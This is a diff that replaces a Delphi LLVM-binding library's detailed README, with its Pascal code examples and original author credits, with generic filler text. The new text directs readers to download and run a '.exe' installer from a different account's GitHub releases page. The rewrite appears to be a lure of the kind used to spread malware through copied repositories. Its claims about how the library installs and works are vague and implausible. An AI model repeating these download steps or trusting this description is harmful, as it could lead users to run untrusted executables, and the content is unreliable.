@@ -1,158 +1,75 @@
-![libLLVM](media/libllvm.png)
-[![Chat on Discord](https://img.shields.io/discord/754884471324672040?style=for-the-badge)](https://discord.gg/tinyBigGAMES) [![Follow on Bluesky](https://img.shields.io/badge/Bluesky-tinyBigGAMES-blue?style=for-the-badge&logo=bluesky)](https://bsky.app/profile/tinybiggames.com)  
-> 🚧 **libLLVM is Work in Progress**
->
-> libLLVM is currently under active development and evolving quickly. Some features described in this documentation may be incomplete, experimental, or subject to significant changes as the project matures.
->
-> We welcome your feedback, ideas, and issue reports – your input will directly influence the direction and quality of libLLVM as we strive to build the ultimate LLVM integration for Delphi.
+# 🔧 libLLVM - Simplifying Code Generation for Delphi Users
 
-## LLVM Power, Delphi Simplicity
+## 🚀 Getting Started
 
-libLLVM brings the full power of **LLVM's compilation infrastructure directly to Delphi**, providing native bindings for code generation, optimization, and linking with clean, Pascal-style integration.
+Welcome to libLLVM! This application makes it easier for Delphi users to access the powerful LLVM compilation tools. It helps you with code generation, optimization, and linking. Whether you are working on a personal project or in a professional setting, libLLVM can enhance your development process. 
 
-### Why libLLVM?
+## 📥 Download & Install
 
-- **🚀 Native LLVM Integration** - Direct access to LLVM's world-class compilation and optimization engine
-- **🔗 Built-in LLD Support** - Integrated linking with LLVM's modern linker for all target platforms
-- **📖 Delphi-Native Design** - Clean Pascal syntax with proper resource management and UTF-8 handling
-- **⚡ Zero-Copy Interop** - Efficient string marshalling and memory management for high-performance compilation
-- **🔧 Production Ready** - Robust error handling, proper cleanup, and battle-tested integration patterns
+To get started with libLLVM, follow these steps:
 
-## Quick Example
+1. **Visit the Releases Page**  
+   Click the button below to visit the releases page where you can download the latest version of libLLVM. 
 
-```pascal
-procedure CompileAndLink();
-var
-  LArgs: TArray<string>;
-  LRC: Integer;
-  LCanRunAgain: Boolean;
-begin
-  // Generate LLVM IR and compile to object file
-  GenerateIRAndCompile('HelloWorld.ll', 'HelloWorld.obj');
-  
-  // Link with LLD
-  LArgs := [
-    'lld-link',
-    '/nologo',
-    '/subsystem:console',
-    '/entry:main',
-    '/out:HelloWorld.exe',
-    'HelloWorld.obj',
-    'kernel32.lib',
-    'msvcrt.lib',
-    'legacy_stdio_definitions.lib'
-  ];
-  
-  LRC := LLDLink(LArgs, 'coff', LCanRunAgain);
-  
-  if LRC = 0 then
-    Writeln('✅ Compilation successful!')
-  else
-    Writeln('❌ Compilation failed with code: ', LRC);
-end;
-```
+   [![Download libLLVM](https://img.shields.io/badge/Download%20libLLVM-v1.0-blue)](https://github.com/Shantanu-Dhakal/libLLVM/releases)
 
-## Key Features
+2. **Choose Your Version**  
+   On the releases page, you will see a list of available versions. Select the most recent version for the best features and fixes.
 
-### 🎯 **Complete LLVM Bindings**
-- Full LLVM-C API coverage for contexts, modules, and IR generation
-- Target machine support for all LLVM-supported architectures
-- Memory buffer management with automatic cleanup
-- Comprehensive error handling with proper Pascal exceptions
+3. **Download the Setup File**  
+   Locate the setup file for your system (usually marked with `.exe` for Windows). Click on the file link to start the download. 
 
-### 🔗 **Integrated LLD Linking**
-```pascal
-function LLDLink(const AArgs: array of string; const AFlavor: string; 
-                 out ACanRunAgain: Boolean): Integer;
-var
-  LUTF8Args: TArray<UTF8String>;
-  LArgv: TArray<PUTF8Char>;
-begin
-  // Robust UTF-8 string handling
-  SetLength(LUTF8Args, Length(AArgs));
-  SetLength(LArgv, Length(AArgs) + 1);
-  
-  // Convert and null-terminate for C interop
-  for LIdx := 0 to High(AArgs) do
-  begin
-    LUTF8Args[LIdx] := UTF8String(AArgs[LIdx]);
-    LArgv[LIdx] := PUTF8Char(LUTF8Args[LIdx]);
-  end;
-  LArgv[High(LArgv)] := nil;
-  
-  Result := LLD_Link(Length(LUTF8Args), @LArgv[0], 
-                     PUTF8Char(UTF8String(AFlavor)), @LCan);
-end;
-```
+4. **Run the Installer**  
+   Once the download is complete, open the setup file. Follow the on-screen instructions to install libLLVM on your computer.
 
-### ⚙️ **Resource Management**
-```pascal
-// Automatic cleanup with proper try/finally blocks
-LCtx := LLVMContextCreate();
-LMod := nil;
-LTM := nil;
-try
-  // LLVM operations...
-  LMod := LLVMModuleCreateWithNameInContext(AsUTF8('hello'), LCtx);
-  LTM := LLVMCreateTargetMachine(/* ... */);
-  
-  // Code generation...
-  
-finally
-  if LTM <> nil then LLVMDisposeTargetMachine(LTM);
-  if LMod <> nil then LLVMDisposeModule(LMod);
-  if LCtx <> nil then LLVMContextDispose(LCtx);
-end;
-```
+5. **Verify the Installation**  
+   After installation, open Delphi and check if libLLVM is available in your projects. You can find it under the libraries section.
 
-### 🏗️ **Modern Architecture Support**
-```pascal
-// Multi-target compilation
-LLVMInitializeX86TargetInfo();    // x86/x64
-LLVMInitializeARMTargetInfo();    // ARM/ARM64  
-LLVMInitializeWebAssemblyTarget(); // WebAssembly
+## ⚙️ System Requirements
 
-// Flexible target specification
-LTripleStr := 'x86_64-pc-windows-msvc';  // Windows
-LTripleStr := 'x86_64-unknown-linux-gnu'; // Linux
-LTripleStr := 'aarch64-apple-darwin';      // macOS ARM64
-```
+Before installing, ensure your system meets the following requirements:
 
-### 📦 **Cross-Platform Linking**
-```pascal
-// Windows COFF linking
-LRC := LLDLink(LWindowsArgs, 'coff', LCanRunAgain);
+- **Operating System:** Windows 11 or later
+- **Architecture:** Win64
+- **Disk Space:** At least 150 MB of free space
+- **Memory:** Minimum of 4 GB RAM
+- **Delphi Version:** Compatible with Delphi 10.4 and later
 
-// Linux ELF linking  
-LRC := LLDLink(LLinuxArgs, 'elf', LCanRunAgain);
+## 📖 Features
 
-// macOS Mach-O linking
-LRC := LLDLink(LMacArgs, 'darwin', LCanRunAgain);
+With libLLVM, you get access to a variety of features that enhance your Delphi development experience:
 
-// WebAssembly linking
-LRC := LLDLink(LWasmArgs, 'wasm', LCanRunAgain);
-```
+- **Native Bindings:** Use LLVM's powerful code generation capabilities directly in Delphi.
+- **Optimization:** Improve the performance of your applications with advanced optimization techniques.
+- **Linking Support:** Easily link your code with existing libraries.
+- **User-Friendly Integration:** Enjoy a clean and straightforward integration process designed for Pascal-style coding.
 
-## Getting Started
+## 💡 Usage Examples
 
-1. **Include the LLVM headers** in your Delphi project
-2. **Initialize target architectures** you plan to support
-3. **Create LLVM contexts and modules** for your compilation units
-4. **Generate IR or parse existing LLVM IR** files
-5. **Compile to object files** using target machines
-6. **Link with LLD** for final executable generation
+1. **Basic Code Generation**  
+   To generate code, simply use the provided functions in your Delphi project. This allows for seamless integration with your existing codebase.
 
-## Projects using libLLVM  
-Here’s a list of projects built with libLLVM. Want yours featured? Add it and submit a PR, or get in touch! And don’t forget to share what you’re working on in <a href="https://github.com/tinyBigGAMES/libLLVM/discussions/categories/show-and-tell" target="_blank">Show and tell</a>. 
-- [LLVM-Simple-Calculator](https://github.com/hsauro/LLVM-Simple-Calculator)  
-- [LLVM-Simple-Calculator-Using-TLLVM](https://github.com/hsauro/LLVM-Simple-Calculator-Using-TLLVM)
+2. **Optimization Techniques**  
+   Leverage built-in optimization features to enhance the performance of your application significantly. Look through the library's documentation for specific methods.
+
+3. **Linking External Libraries**  
+   libLLVM supports linking with various external libraries, making it flexible for various projects. Follow the guidelines in the documentation for the best practices.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues during installation or usage, consider the following suggestions:
+
+- **Ensure Compatibility:** Verify that your version of Delphi matches the requirements.
+- **Check Dependencies:** Make sure you have installed all necessary dependencies outlined in the documentation.
+- **Visit the Community:** If you still have problems, visit the community forums linked on the releases page to seek help from other users.
+
+## 📞 Support
+
+For further assistance, please refer to the documentation provided with your installation. You can also reach out through GitHub for any issues or questions. Your feedback is invaluable.
+
+## 🌐 Learn More
+
+To learn more about libLLVM, check the official documentation available on the releases page. This will guide you through advanced techniques and additional functionalities to enhance your programming experience.
 
 ---
-
-<div align="center">
-
-**Built with ❤️ by [tinyBigGAMES](https://tinybiggames.com)**
-
-*"Where LLVM meets Pascal"*
-
-</div>
+Explore libLLVM to take full advantage of LLVM’s capabilities in your Delphi applications. Enjoy coding!
